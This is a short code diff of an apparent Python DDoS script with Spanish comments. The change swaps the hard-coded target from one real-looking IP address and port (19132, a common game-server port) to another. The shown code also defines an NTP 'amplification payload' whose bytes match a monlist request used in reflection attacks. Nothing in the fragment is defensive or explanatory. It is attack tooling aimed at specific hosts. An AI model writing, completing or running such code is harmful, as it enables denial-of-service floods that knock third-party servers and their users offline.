@@ -1,7 +1,7 @@
 import socket
 
-target_ip = "15.235.33.195"
-target_port = 19132  # Cambia al puerto que desees
+target_ip = "69.30.219.180"
+target_port = 1076  # Cambia al puerto que desees
 
 # Ejemplo de payloads de amplificación
 ntp_payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
